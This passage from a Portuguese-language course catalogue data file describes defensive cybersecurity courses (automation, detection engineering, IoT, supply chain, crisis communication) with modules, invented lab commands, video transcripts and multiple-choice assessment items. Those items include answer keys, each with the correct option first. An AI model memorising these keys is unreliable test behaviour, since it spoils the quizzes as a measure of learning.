      { id: "auto-1", prompt: "Uma automação segura deve começar por:", options: ["Definir propósito, escopo e responsável", "Executar em produção sem revisão", "Solicitar privilégios máximos", "Ocultar o que faz"], correctAnswer: 0, explanation: "Objetivo e limites claros evitam uso indevido e facilitam a revisão de impacto." },
      { id: "auto-2", prompt: "Validar entradas em uma automação ajuda a:", options: ["Reduzir ações fora do formato ou escopo esperado", "Aumentar privilégios", "Dispensar logs", "Eliminar testes"], correctAnswer: 0, explanation: "Validações tornam falhas e usos indevidos mais visíveis antes da execução." },
      { id: "auto-3", prompt: "Logs de execução devem registrar:", options: ["Contexto, resultado e identificadores sem expor segredos", "Senhas em texto puro", "Apenas mensagens de sucesso", "Nenhum dado para evitar auditoria"], correctAnswer: 0, explanation: "Registros equilibram rastreabilidade e proteção de dados, apoiando operação e investigação." },
      { id: "auto-4", prompt: "Uma automação reversível é desejável porque:", options: ["Permite corrigir efeitos inesperados de forma controlada", "Elimina a necessidade de aprovação", "Sempre deve apagar logs", "Substitui backups"], correctAnswer: 0, explanation: "Planos de reversão reduzem risco operacional quando uma rotina produz resultado não previsto." },
      { id: "auto-5", prompt: "Revisão por pares antes de automatizar ajuda a:", options: ["Identificar lacunas de segurança e impacto", "Evitar documentação", "Aumentar o escopo sem autorização", "Compartilhar segredos"], correctAnswer: 0, explanation: "Outro olhar melhora a qualidade de validações, permissões, tratamento de erros e registros." },
    ],
    videoLearning: {
      provider: "YouTube", label: "Trilha de vídeo complementar: Linux para Operações", attribution: "Playlist pública externa do Curso em Vídeo incorporada como apoio aos fundamentos de terminal e operações. Roteiros de automação, capítulos, transcrições, práticas e avaliações são autorais da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/playlist?list=PLHz_AreHm4dlIXleu20uwPWFOSswqLYbV", embedUrl: "https://www.youtube-nocookie.com/embed/videoseries?list=PLHz_AreHm4dlIXleu20uwPWFOSswqLYbV&rel=0",
      sessions: [
        { moduleIndex: 0, title: "Terminal com limites", duration: "≈ 18 min", focus: "Usar fundamentos de terminal para planejar rotinas com escopo explícito e ações previsíveis.", chapters: [{ time: "00:00", title: "Propósito da rotina", summary: "Defina o resultado esperado antes de automatizar." }, { time: "06:00", title: "Escopo mínimo", summary: "Limite diretórios, dados e permissões necessárias." }, { time: "13:00", title: "Critério de parada", summary: "Estabeleça quando a rotina deve interromper e alertar." }], transcript: [{ time: "00:00", text: "Automação segura começa com uma tarefa pequena, compreendida e repetível, não com um comando amplo aplicado sem contexto." }, { time: "06:00", text: "O menor privilégio e o escopo explícito reduzem a chance de uma rotina afetar ativos ou dados além do necessário." }, { time: "13:00", text: "Critérios de parada ajudam a transformar comportamento inesperado em uma oportunidade de revisão, e não em impacto automático." }] },
        { moduleIndex: 1, title: "Validação e registros", duration: "≈ 18 min", focus: "Aplicar validações e logs úteis para tornar uma tarefa automatizada auditável e segura.", chapters: [{ time: "00:00", title: "Entradas esperadas", summary: "Aceite somente formatos e valores definidos." }, { time: "07:00", title: "Saídas seguras", summary: "Masque dados sensíveis e registre o necessário." }, { time: "14:00", title: "Falhas previsíveis", summary: "Trate erros com mensagens úteis e parada controlada." }], transcript: [{ time: "00:00", text: "Validar entradas impede que parâmetros inesperados mudem o objetivo da rotina ou aumentem seu impacto operacional." }, { time: "07:00", text: "Registros devem permitir entender o que ocorreu, preservando ao mesmo tempo segredos e dados que não precisam ser expostos." }, { time: "14:00", text: "Erros tratados de forma clara facilitam a intervenção humana e evitam que a automação continue em estado desconhecido." }] },
        { moduleIndex: 2, title: "Revisão e reversão", duration: "≈ 18 min", focus: "Incorporar testes, revisão e capacidade de reversão à rotina antes de seu uso autorizado.", chapters: [{ time: "00:00", title: "Teste isolado", summary: "Valide comportamento em dados e ambiente de treinamento." }, { time: "06:00", title: "Revisão por pares", summary: "Busque falhas de lógica, permissão e privacidade." }, { time: "13:00", title: "Retorno controlado", summary: "Planeje como interromper ou desfazer um efeito indesejado." }], transcript: [{ time: "00:00", text: "Ambientes de treinamento e dados sintéticos permitem observar efeitos de uma rotina antes de qualquer uso operacional autorizado." }, { time: "06:00", text: "A revisão por pares ajuda a identificar suposições invisíveis para quem escreveu a automação e fortalece sua documentação." }, { time: "13:00", text: "Um plano de reversão deve ser simples, testado e acompanhado por registros que permitam comprovar o retorno ao estado esperado." }] },
      ],
    },
  },
  {
    slug: "detection-engineering", code: "DET-ENG-01", title: "Engenharia de Detecção", shortTitle: "Detecção", level: "Avançado", duration: "18 horas", lessons: 15, labs: 2, quizCount: 5, accent: "cyan", icon: "network",
    description: "Desenho, validação e evolução de detecções a partir de casos de uso, telemetria confiável e métricas de qualidade.", focus: "Criar regras defensivas explicáveis em dados sintéticos, conectando hipótese, fonte de log, contexto, resposta e melhoria contínua.",
    outcomes: ["Transformar um caso de uso defensivo em uma hipótese de detecção verificável.", "Definir requisitos de telemetria, contexto e critérios de qualidade para alertas.", "Medir e aprimorar detecções sem confundir sinais automatizados com conclusões."],
    modules: [
      { title: "Casos de uso e telemetria", lessons: 5, description: "Ameaças, ativos, hipóteses, fontes de dados, qualidade e retenção de eventos." },
      { title: "Lógica e validação", lessons: 5, description: "Regras, baselines, contexto, falsos positivos e testes com dados sintéticos." },
      { title: "Operação e evolução", lessons: 5, description: "Triage, playbooks, métricas, versionamento, revisão e documentação de detecções." },
    ],
    labsList: [
      { title: "Especificação de detecção", description: "Escreva uma hipótese para uma atividade anômala fictícia.", objective: "Definir fonte, condição, contexto e critério de validação sem consultar telemetria de terceiros.", command: "especificar-deteccao --caso login-fora-horario --dados sinteticos", output: "Hipótese: acesso fora do padrão\nFontes: identidade e dispositivo\nContexto: papel e horário\nResultado: pronto para teste" },
      { title: "Revisão de qualidade de alerta", description: "Avalie uma detecção simulada antes de colocá-la em observação.", objective: "Diferenciar sinal, evidência adicional e ação recomendada para reduzir ruído operacional.", command: "validar-regra --id DET-LAB-07 --ambiente treino", output: "Alertas de teste: 3\nFalsos positivos: 1\nAjuste: incluir dispositivo gerenciado\nStatus: repetir validação" },
    ],
    assessment: "Avaliação de hipóteses, telemetria, lógica, validação, triagem e melhoria de regras de detecção.",
    assessmentQuestions: [
      { id: "det-1", prompt: "Uma boa regra de detecção começa por:", options: ["Um caso de uso e uma hipótese que possam ser verificados", "Uma ferramenta escolhida sem objetivo", "A exclusão de logs", "Uma conclusão sem evidências"], correctAnswer: 0, explanation: "Casos de uso conectam risco, ativos e comportamento esperado à telemetria necessária para observar um desvio." },
      { id: "det-2", prompt: "Contexto adicional em um alerta serve para:", options: ["Ajudar a triagem e reduzir conclusões precipitadas", "Substituir toda investigação", "Eliminar evidências", "Aumentar ruído propositalmente"], correctAnswer: 0, explanation: "Origem, papel da conta, dispositivo e horário ajudam a entender se um sinal merece investigação prioritária." },
      { id: "det-3", prompt: "Validar uma nova detecção com dados sintéticos permite:", options: ["Avaliar comportamento e ajustar a regra com segurança", "Confirmar incidentes reais", "Dispensar processo de mudança", "Excluir documentação"], correctAnswer: 0, explanation: "Dados sintéticos facilitam testes repetíveis sem expor informações ou interferir em operações reais." },
      { id: "det-4", prompt: "Uma métrica de qualidade de alerta pode observar:", options: ["Utilidade para triagem, ruído e tempo de validação", "Apenas a cor do dashboard", "Quantidade de usuários", "Tamanho do log"], correctAnswer: 0, explanation: "Qualidade está ligada à capacidade de apoiar decisões com sinais contextualizados e esforço operacional proporcional." },
      { id: "det-5", prompt: "Versionar regras de detecção é importante para:", options: ["Rastrear mudanças, revisões e resultados", "Eliminar responsabilidade", "Manter ajustes ocultos", "Desativar testes"], correctAnswer: 0, explanation: "Versionamento torna evolução, aprovação e reversão de lógica mais auditáveis e colaborativas." },
    ],
    videoLearning: {
      provider: "YouTube", label: "Trilha de vídeo complementar: SOC e SIEM", attribution: "Playlist pública externa sobre operação de SOC e SIEM incorporada como material complementar. Parte do conteúdo audiovisual está em inglês; capítulos, transcrições, práticas e avaliações são autorais e em português da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/playlist?list=PLHGcMOogAnre0zfLBIhpq1fHvLxABGtuD", embedUrl: "https://www.youtube-nocookie.com/embed/videoseries?list=PLHGcMOogAnre0zfLBIhpq1fHvLxABGtuD&rel=0",
      sessions: [
        { moduleIndex: 0, title: "Do caso de uso ao dado", duration: "≈ 22 min", focus: "Conectar objetivos de defesa a eventos, campos e requisitos de telemetria.", chapters: [{ time: "00:00", title: "Pergunta defensiva", summary: "Comece pelo comportamento e pelo ativo a proteger." }, { time: "08:00", title: "Fonte confiável", summary: "Escolha logs que respondam à hipótese." }, { time: "16:00", title: "Qualidade e contexto", summary: "Verifique cobertura, horário e enriquecimento." }], transcript: [{ time: "00:00", text: "Uma detecção começa melhor quando responde a uma pergunta clara sobre comportamento, ativo e possível consequência para o negócio." }, { time: "08:00", text: "A fonte de telemetria precisa registrar campos suficientes para diferenciar uma hipótese de um evento comum do ambiente." }, { time: "16:00", text: "Cobertura de logs, sincronização de horário e contexto de identidade determinam a qualidade das conclusões que uma regra pode apoiar." }] },
        { moduleIndex: 1, title: "Regra, ruído e validação", duration: "≈ 22 min", focus: "Construir lógica defensiva simples, validar em dados sintéticos e reduzir falsos positivos de modo responsável.", chapters: [{ time: "00:00", title: "Sinal observável", summary: "Defina uma condição que possa ser medida." }, { time: "08:00", title: "Contexto que decide", summary: "Inclua fatores que alteram a prioridade do sinal." }, { time: "16:00", title: "Teste repetível", summary: "Avalie a regra com cenários controlados." }], transcript: [{ time: "00:00", text: "Uma regra bem definida descreve o sinal esperado e deixa explícito o que ainda precisa ser investigado por uma pessoa analista." }, { time: "08:00", text: "Contexto de conta, dispositivo, localidade e horário pode reduzir ruído sem esconder comportamentos relevantes para a equipe." }, { time: "16:00", text: "Testes com dados sintéticos mostram se a regra é compreensível, acionável e proporcional antes de entrar na rotina do SOC." }] },
        { moduleIndex: 2, title: "Ciclo de melhoria", duration: "≈ 20 min", focus: "Tratar regras como produtos operacionais que precisam de triagem, documentação, métricas e revisão.", chapters: [{ time: "00:00", title: "Resposta orientada", summary: "Associe cada alerta a um próximo passo seguro." }, { time: "07:00", title: "Métricas úteis", summary: "Meça ruído, contexto e utilidade para o analista." }, { time: "14:00", title: "Evolução rastreável", summary: "Versione ajustes e preserve lições aprendidas." }], transcript: [{ time: "00:00", text: "Uma detecção não encerra a investigação: ela orienta o primeiro passo de triagem e as evidências que precisam ser verificadas." }, { time: "07:00", text: "Métricas devem mostrar se a equipe consegue validar alertas com contexto suficiente e em um tempo coerente com a prioridade do risco." }, { time: "14:00", text: "Documentar e versionar ajustes permite aprender com resultados, reverter mudanças inadequadas e manter confiança nas regras operacionais." }] },
      ],
    },
  },
  {
    slug: "iot-security-foundations", code: "IOT-SEC-01", title: "Segurança de IoT e Dispositivos Conectados", shortTitle: "Segurança de IoT", level: "Intermediário", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "cyan", icon: "network",
    description: "Identidade, atualização, segmentação e monitoramento para reduzir riscos em dispositivos conectados em ambientes de treinamento.", focus: "Avaliar o ciclo de vida de dispositivos conectados e propor controles proporcionais, usando inventários e cenários simulados.",
    outcomes: ["Identificar riscos de inventário, identidade, atualização e exposição de dispositivos conectados.", "Definir segmentação, autenticação e telemetria para um cenário de laboratório.", "Comunicar limitações e prioridades de melhoria sem realizar testes em dispositivos reais."],
    modules: [
      { title: "Ciclo de vida e inventário", lessons: 4, description: "Ativos, proprietários, firmware, superfícies de exposição e critérios de risco." },
      { title: "Identidade e segmentação", lessons: 4, description: "Credenciais, redes separadas, privilégio mínimo e acesso administrativo controlado." },
      { title: "Telemetria e resposta", lessons: 4, description: "Atualizações, sinais observáveis, triagem e comunicação de incidentes simulados." },
    ],
    labsList: [
      { title: "Inventário conectado", description: "Classifique uma lista fictícia de sensores e gateways.", objective: "Registrar proprietário, rede, firmware e prioridade sem acessar dispositivos reais.", command: "inventariar-iot --cenario laboratorio-cidade", output: "Ativos sintéticos: 8\nProprietários definidos: 8\nFirmware pendente: 2\nPrioridade: revisar gateways" },
      { title: "Segmentação de laboratório", description: "Revise uma proposta de comunicação entre sensores simulados e um serviço central.", objective: "Aplicar menor privilégio e separar administração de telemetria.", command: "revisar-segmentacao --ambiente treino-iot", output: "Rede de sensores: isolada\nAdministração: acesso aprovado\nTelemetria: somente saída\nStatus: desenho aprovado" },
    ],
    assessment: "Avaliação de inventário, identidade, segmentação, atualização e resposta para dispositivos conectados.",
    assessmentQuestions: [
      { id: "iot-1", prompt: "O primeiro passo para proteger dispositivos conectados é:", options: ["Manter inventário com proprietário e contexto", "Expor todos à internet", "Usar uma senha compartilhada", "Desativar registros"], correctAnswer: 0, explanation: "Inventário e responsabilidade permitem priorizar atualizações, configurações e riscos." },
      { id: "iot-2", prompt: "Segmentação em IoT busca principalmente:", options: ["Limitar comunicações ao necessário", "Aumentar acesso administrativo", "Eliminar atualizações", "Ocultar ativos"], correctAnswer: 0, explanation: "Redes separadas reduzem o alcance de um problema e facilitam o controle de fluxos." },
      { id: "iot-3", prompt: "Atualizações de firmware devem ser tratadas como:", options: ["Mudanças planejadas e verificáveis", "Ações ocultas sem registro", "Substitutas de inventário", "Dispensa de testes"], correctAnswer: 0, explanation: "Mudanças rastreáveis e testadas reduzem risco operacional e facilitam reversão." },
      { id: "iot-4", prompt: "Telemetria útil de um dispositivo conectado ajuda a:", options: ["Observar desvios e apoiar triagem", "Confirmar ataques sem análise", "Expor segredos", "Substituir responsáveis"], correctAnswer: 0, explanation: "Sinais observáveis devem apoiar investigação humana e preservar privacidade." },
      { id: "iot-5", prompt: "Em uma prática segura de IoT, o aluno deve:", options: ["Usar dados e dispositivos simulados", "Testar equipamentos de terceiros", "Modificar rede pública", "Coletar credenciais reais"], correctAnswer: 0, explanation: "A formação usa cenários controlados para evitar impacto em ativos fora de escopo." },
    ],
    externalResources: [{ category: "Documentação", title: "OWASP Internet of Things Project", source: "OWASP Foundation", license: "Conforme termos de uso e licenciamento publicados pela OWASP.", usage: "Referência complementar para nomenclatura de riscos; o roteiro e as práticas da Academia são autorais.", href: "https://owasp.org/www-project-internet-of-things/" }],
    audioGuide: { label: "Audioguia: decisões seguras para IoT", description: "Síntese autoral do ciclo de inventário, segmentação e monitoramento para revisar antes da prática.", narration: "CyberDimension Academy — narração autoral em português", duration: "≈ 4 min", sourceUrl: "/manus-storage/iot-security-audioguia_a61e0e45.wav" },
    videoLearning: { provider: "YouTube", label: "Vídeo complementar: fundamentos de segurança em IoT", attribution: "Vídeo público externo incorporado como apoio complementar. Audioguia, roteiro, capítulos, transcrições, laboratórios, quizzes e avaliação são autorais da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/watch?v=eTGYAtwYQEg", embedUrl: "https://www.youtube-nocookie.com/embed/eTGYAtwYQEg?rel=0", sessions: [
      { moduleIndex: 0, title: "Ativos conectados com contexto", duration: "≈ 16 min", focus: "Criar inventário com responsabilidade e risco antes de decidir controles.", chapters: [{ time: "00:00", title: "O ativo", summary: "Conheça função, proprietário e ambiente." }, { time: "06:00", title: "A superfície", summary: "Observe interfaces, firmware e conectividade." }, { time: "12:00", title: "A prioridade", summary: "Classifique impacto e exposição." }], transcript: [{ time: "00:00", text: "Dispositivos conectados só podem ser protegidos de forma consistente quando seu propósito, proprietário e contexto de rede estão documentados." }, { time: "06:00", text: "Interfaces administrativas e versões de firmware precisam entrar no inventário para apoiar decisões de atualização e acesso." }, { time: "12:00", text: "Prioridade não depende apenas do tipo de dispositivo, mas também do impacto que sua indisponibilidade ou exposição pode gerar." }] },
      { moduleIndex: 1, title: "Acesso e rede mínimos", duration: "≈ 16 min", focus: "Aplicar identidade e segmentação com escopo reduzido em cenário de treinamento.", chapters: [{ time: "00:00", title: "Identidade", summary: "Evite credenciais padrão e contas compartilhadas." }, { time: "06:00", title: "Fluxos", summary: "Permita somente comunicações esperadas." }, { time: "12:00", title: "Administração", summary: "Separe operação e configuração." }], transcript: [{ time: "00:00", text: "Credenciais únicas e processos de administração aprovados reduzem a dependência de acessos genéricos em dispositivos conectados." }, { time: "06:00", text: "Segmentação começa ao definir quais sistemas precisam realmente conversar, em vez de permitir conectividade ampla por padrão." }, { time: "12:00", text: "A administração deve acontecer por caminho controlado, com registro e privilégios proporcionais à tarefa." }] },
      { moduleIndex: 2, title: "Atualização e sinais", duration: "≈ 16 min", focus: "Usar atualizações e telemetria como atividades operacionais rastreáveis.", chapters: [{ time: "00:00", title: "Mudança planejada", summary: "Teste e registre antes de atualizar." }, { time: "06:00", title: "Sinais úteis", summary: "Colete apenas o necessário para triagem." }, { time: "12:00", title: "Resposta", summary: "Escalone com contexto e evidências." }], transcript: [{ time: "00:00", text: "Atualizações de dispositivos conectados precisam de inventário, janela de mudança e uma forma clara de verificar o resultado." }, { time: "06:00", text: "Telemetria deve ser suficiente para observar desvios, sem transformar a coleta em exposição desnecessária de dados." }, { time: "12:00", text: "Uma resposta madura comunica o que foi observado, quais ativos estão envolvidos e qual próximo passo seguro foi aprovado." }] },
    ] },
  },
  {
    slug: "software-supply-chain-security", code: "SSC-01", title: "Segurança da Cadeia de Suprimentos de Software", shortTitle: "Supply Chain", level: "Intermediário", duration: "15 horas", lessons: 12, labs: 2, quizCount: 5, accent: "purple", icon: "cpu",
    description: "Dependências, integridade de builds, SBOM, revisões e resposta a risco de fornecedores em uma cadeia de software.", focus: "Organizar evidências de componentes e controles de build em cenários simulados, com decisões verificáveis e comunicação responsável.",
    outcomes: ["Explicar riscos de dependências, artefatos e fornecedores de software.", "Ler um inventário de componentes e identificar lacunas de rastreabilidade.", "Propor controles de revisão, integridade e resposta para um pipeline de treinamento."],
    modules: [{ title: "Componentes e dependências", lessons: 4, description: "Inventário, versões, origem, SBOM e critérios de confiança." }, { title: "Build e integridade", lessons: 4, description: "Revisão, assinatura, segredos, logs e mudanças aprovadas." }, { title: "Risco e resposta", lessons: 4, description: "Avaliação de fornecedor, vulnerabilidade, comunicação e melhoria contínua." }],
    labsList: [{ title: "Leitura de SBOM simulado", description: "Analise um inventário fictício de componentes de uma aplicação.", objective: "Localizar versão, origem e responsável de componentes sem baixar ou executar código.", command: "revisar-sbom --arquivo app-treino.sbom", output: "Componentes: 14\nOrigem registrada: 13\nVersão pendente: 1\nAção: solicitar revisão" }, { title: "Revisão de pipeline", description: "Avalie controles fictícios de um processo de build.", objective: "Verificar evidência de revisão, logs e proteção de segredos em um cenário controlado.", command: "auditar-build --pipeline laboratorio", output: "Revisão por pares: ativa\nLogs: disponíveis\nSegredos: mascarados\nStatus: melhoria recomendada" }],
    assessment: "Avaliação de dependências, SBOM, integridade de build, fornecedores e comunicação de risco.",
    assessmentQuestions: [{ id: "ssc-1", prompt: "Uma SBOM ajuda a organização a:", options: ["Conhecer componentes e versões de um software", "Executar código sem revisão", "Eliminar testes", "Ocultar fornecedores"], correctAnswer: 0, explanation: "Inventários de componentes apoiam rastreabilidade, resposta e avaliação de dependências." }, { id: "ssc-2", prompt: "Revisão por pares em um pipeline ajuda a:", options: ["Reduzir mudanças não verificadas", "Publicar segredos", "Eliminar logs", "Ignorar dependências"], correctAnswer: 0, explanation: "Revisões tornam decisões e alterações mais rastreáveis e discutíveis." }, { id: "ssc-3", prompt: "Integridade de artefato significa:", options: ["Verificar origem e alterações do que será distribuído", "Aceitar qualquer arquivo externo", "Desligar registros", "Pular validações"], correctAnswer: 0, explanation: "A integridade reduz incerteza sobre o que foi construído e de onde veio." }, { id: "ssc-4", prompt: "Um risco de fornecedor deve ser tratado com:", options: ["Contexto, evidência e plano proporcional", "Suposições sem registro", "Exposição pública imediata", "Credenciais compartilhadas"], correctAnswer: 0, explanation: "Decisões responsáveis combinam avaliação técnica, impacto e comunicação apropriada." }, { id: "ssc-5", prompt: "No laboratório, a análise de dependência deve:", options: ["Usar dados e manifestos fictícios", "Executar binários desconhecidos", "Modificar repositórios públicos", "Coletar tokens reais"], correctAnswer: 0, explanation: "Práticas controladas permitem desenvolver raciocínio sem risco a ambientes reais." }],
    externalResources: [{ category: "Documentação", title: "SLSA — Supply-chain Levels for Software Artifacts", source: "OpenSSF", license: "Conforme licença e termos publicados pelo projeto SLSA.", usage: "Referência complementar sobre integridade de cadeia de software; materiais didáticos e práticas são autorais.", href: "https://slsa.dev/" }],
    audioGuide: { label: "Audioguia: rastreabilidade na cadeia de software", description: "Revisão autoral de componentes, builds e decisões de resposta para acompanhar o estudo do curso.", narration: "CyberDimension Academy — narração autoral em português", duration: "≈ 4 min", sourceUrl: "/manus-storage/supply-chain-audioguia_96b2eb8c.wav" },
    videoLearning: { provider: "YouTube", label: "Vídeo complementar: segurança de dependências e supply chain", attribution: "Vídeo público externo incorporado como referência complementar. Audioguia, material de estudo, laboratórios e avaliações são autorais da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/watch?v=n3COOM6asWU", embedUrl: "https://www.youtube-nocookie.com/embed/n3COOM6asWU?rel=0", sessions: [{ moduleIndex: 0, title: "Componentes conhecidos", duration: "≈ 17 min", focus: "Usar um inventário de componentes para organizar decisões de risco.", chapters: [{ time: "00:00", title: "Dependência", summary: "Entenda o papel de cada componente." }, { time: "06:00", title: "Origem", summary: "Registre de onde veio e qual versão é usada." }, { time: "12:00", title: "Responsável", summary: "Defina quem revisa mudanças." }], transcript: [{ time: "00:00", text: "Cadeia de software segura começa pela capacidade de responder quais componentes existem e por que foram escolhidos." }, { time: "06:00", text: "Origem e versão são informações básicas para investigar exposição e planejar atualizações com menor incerteza." }, { time: "12:00", text: "Responsáveis e processos de revisão transformam inventário em uma prática contínua, não em uma planilha isolada." }] }, { moduleIndex: 1, title: "Build verificável", duration: "≈ 17 min", focus: "Reconhecer controles que tornam uma construção de software mais rastreável.", chapters: [{ time: "00:00", title: "Mudança aprovada", summary: "Registre revisão antes do build." }, { time: "06:00", title: "Artefato", summary: "Preserve evidência de origem." }, { time: "12:00", title: "Segredos", summary: "Proteja credenciais do processo." }], transcript: [{ time: "00:00", text: "Um build verificável começa com mudanças revisadas e com registros que expliquem quem autorizou a alteração." }, { time: "06:00", text: "Artefatos precisam de rastreabilidade para que a equipe saiba o que foi distribuído e como foi produzido." }, { time: "12:00", text: "Segredos não devem ser colocados em código, logs ou mensagens; controles de acesso e mascaramento são essenciais." }] }, { moduleIndex: 2, title: "Decisão responsável", duration: "≈ 17 min", focus: "Comunicar risco de dependência e organizar resposta baseada em evidências.", chapters: [{ time: "00:00", title: "Contexto", summary: "Associe o componente ao impacto real." }, { time: "06:00", title: "Prioridade", summary: "Defina próximos passos proporcionais." }, { time: "12:00", title: "Lição", summary: "Atualize controles após a resposta." }], transcript: [{ time: "00:00", text: "Um alerta de dependência só é útil quando conectado ao uso do componente, exposição e impacto para o serviço." }, { time: "06:00", text: "Priorizar não significa ignorar riscos: significa organizar recursos e comunicar claramente o motivo de cada decisão." }, { time: "12:00", text: "Depois da resposta, equipes maduras revisam inventário, processo de atualização e documentação para reduzir recorrência." }] }] },
  },
  {
    slug: "cyber-crisis-communication", code: "CRISIS-COM-01", title: "Comunicação e Gestão de Crise Cibernética", shortTitle: "Crise Cibernética", level: "Avançado", duration: "14 horas", lessons: 12, labs: 2, quizCount: 5, accent: "green", icon: "shield",
    description: "Decisões, mensagens, papéis e documentação para comunicar incidentes com clareza, precisão e respeito a evidências.", focus: "Coordenar comunicação de crise em cenários simulados, preservando incertezas, aprovações e limites de divulgação.",
    outcomes: ["Estruturar uma mensagem inicial baseada em fatos confirmados e lacunas conhecidas.", "Distinguir atualização técnica, executiva, jurídica e de cliente em um cenário simulado.", "Organizar linha do tempo e lições aprendidas para melhoria do programa."],
    modules: [{ title: "Preparação e papéis", lessons: 4, description: "Planos, responsáveis, canais, aprovações e critérios de acionamento." }, { title: "Mensagem baseada em evidência", lessons: 4, description: "Fatos, incertezas, impacto, ação em curso e linguagem adequada ao público." }, { title: "Recuperação e aprendizagem", lessons: 4, description: "Atualizações, registros, encerramento e lições aprendidas." }],
    labsList: [{ title: "Primeira atualização", description: "Escreva uma comunicação inicial para um incidente fictício.", objective: "Separar fato confirmado, impacto em investigação e próximo horário de atualização.", command: "redigir-atualizacao --cenario indisponibilidade-simulada", output: "Fato confirmado: serviço indisponível\nImpacto: em avaliação\nAção: equipe acionada\nPróxima atualização: 30 min" }, { title: "Linha do tempo segura", description: "Organize eventos sintéticos de uma resposta a incidente.", objective: "Registrar decisões e evidências sem incluir credenciais, dados pessoais ou suposições como fatos.", command: "organizar-cronologia --caso CRISIS-LAB-03", output: "Eventos registrados: 6\nFatos separados de hipóteses: sim\nAprovação de comunicação: pendente\nStatus: revisão solicitada" }],
    assessment: "Avaliação de preparação, fatos, públicos, aprovações, atualizações e lições aprendidas em crise cibernética.",
    assessmentQuestions: [{ id: "crisis-1", prompt: "Uma comunicação inicial de incidente deve priorizar:", options: ["Fatos confirmados e próximo passo", "Suposições apresentadas como certeza", "Detalhes sensíveis sem aprovação", "Silêncio sem plano"], correctAnswer: 0, explanation: "Clareza sobre o que se sabe, o que está sendo avaliado e quando haverá atualização reduz ruído." }, { id: "crisis-2", prompt: "A linha do tempo de uma crise serve para:", options: ["Registrar decisões e evidências de forma rastreável", "Ocultar erros", "Substituir investigação", "Excluir aprovações"], correctAnswer: 0, explanation: "Cronologias apoiam coordenação, revisão e lições aprendidas após o evento." }, { id: "crisis-3", prompt: "Mensagens para públicos diferentes devem:", options: ["Manter fatos consistentes e adaptar o nível de detalhe", "Contradizer informações", "Ignorar aprovações", "Expor dados pessoais"], correctAnswer: 0, explanation: "Públicos têm necessidades diferentes, mas a base factual e os limites de divulgação devem ser coerentes." }, { id: "crisis-4", prompt: "Uma incerteza deve ser comunicada como:", options: ["Ponto em investigação, com compromisso de atualização", "Fato confirmado", "Informação apagada", "Culpa atribuída"], correctAnswer: 0, explanation: "Reconhecer limites do conhecimento preserva confiança e evita decisões baseadas em informação imprecisa." }, { id: "crisis-5", prompt: "Lições aprendidas após uma crise buscam:", options: ["Melhorar preparação e resposta futura", "Punir sem análise", "Apagar registros", "Evitar documentação"], correctAnswer: 0, explanation: "A revisão posterior transforma evidências e experiência em melhorias concretas de processo e comunicação." }],
    externalResources: [{ category: "Documentação", title: "NIST Computer Security Incident Handling Guide", source: "NIST", license: "Documento público do NIST; uso conforme os termos de publicação aplicáveis.", usage: "Referência complementar para estrutura de resposta; os roteiros e exercícios da Academia são autorais.", href: "https://csrc.nist.gov/pubs/sp/800/61/r2/final" }],
    audioGuide: { label: "Audioguia: comunicar sob pressão com evidências", description: "Orientação autoral para diferenciar fatos, hipóteses e próximos passos em uma comunicação de crise.", narration: "CyberDimension Academy — narração autoral em português", duration: "≈ 5 min", sourceUrl: "/manus-storage/crisis-communication-audioguia_9b503406.wav" },
    videoLearning: { provider: "YouTube", label: "Vídeo complementar: comunicação em incidentes", attribution: "Vídeo público externo incorporado como material complementar. Audioguia, roteiros, exercícios, laboratórios e avaliações são autorais da CyberDimension Academy.", sourceUrl: "https://www.youtube.com/watch?v=zEhHJpaxJjs", embedUrl: "https://www.youtube-nocookie.com/embed/zEhHJpaxJjs?rel=0", sessions: [{ moduleIndex: 0, title: "Preparar para decidir", duration: "≈ 15 min", focus: "Definir papéis e canais antes que uma crise aconteça.", chapters: [{ time: "00:00", title: "Responsáveis", summary: "Saiba quem aprova e quem informa." }, { time: "05:00", title: "Canais", summary: "Prepare caminhos de contato seguros." }, { time: "11:00", title: "Ritmo", summary: "Defina cadência de atualização." }], transcript: [{ time: "00:00", text: "Comunicação de crise funciona melhor quando papéis e responsabilidades foram combinados antes do evento e podem ser acionados com rapidez." }, { time: "05:00", text: "Canais definidos evitam mensagens fragmentadas e ajudam a manter registros que serão relevantes para a linha do tempo." }, { time: "11:00", text: "Cadência de atualização dá previsibilidade a quem depende da informação, mesmo quando a investigação ainda tem incertezas." }] }, { moduleIndex: 1, title: "Fatos, impacto e ação", duration: "≈ 15 min", focus: "Construir atualizações honestas e úteis a partir de evidências.", chapters: [{ time: "00:00", title: "Fato", summary: "Diga somente o que foi confirmado." }, { time: "05:00", title: "Impacto", summary: "Explique o que está sendo avaliado." }, { time: "11:00", title: "Ação", summary: "Indique o próximo passo aprovado." }], transcript: [{ time: "00:00", text: "Fatos confirmados devem ser separados de hipóteses para que decisões e mensagens não amplifiquem ruído durante uma crise." }, { time: "05:00", text: "Quando o impacto ainda é avaliado, comunicar esse limite é mais responsável do que preencher a lacuna com estimativas." }, { time: "11:00", text: "A próxima ação e o horário previsto de atualização demonstram coordenação sem prometer resultados que a equipe ainda não pode garantir." }] }, { moduleIndex: 2, title: "Encerrar aprendendo", duration: "≈ 15 min", focus: "Documentar a recuperação e transformar o cenário em melhorias mensuráveis.", chapters: [{ time: "00:00", title: "Recuperação", summary: "Confirme retorno com evidências." }, { time: "05:00", title: "Registro", summary: "Preserve decisões e aprovações." }, { time: "11:00", title: "Melhoria", summary: "Converta lições em responsáveis e prazo." }], transcript: [{ time: "00:00", text: "Recuperação precisa ser validada por sinais e critérios definidos, não apenas pela percepção de que o serviço voltou a responder." }, { time: "05:00", text: "Registros de decisão ajudam a explicar escolhas, identificar dependências e apoiar revisões posteriores de forma justa." }, { time: "11:00", text: "Lições aprendidas se tornam úteis quando resultam em melhoria com responsável, prioridade e acompanhamento definidos." }] }] },
  },
{
    slug: "linux-cli-pratico", code: "LINUX-01", title: "Linux na Prática — CLI no Terminal", shortTitle: "Linux CLI", level: "Iniciante", duration: "84 horas", lessons: 12, labs: 3, quizCount: 6, accent: "green", icon: "terminal",
    description: "Curso prático com Linux em WebAssembly no navegador: terminal, comandos, processos, logs, redes e segurança. 12 módulos, 36 exercícios CLI e certificado de 84 horas.", focus: "Dominar terminal Linux com prática real em ambiente isolado, sem backend e sem risco ao sistema.",
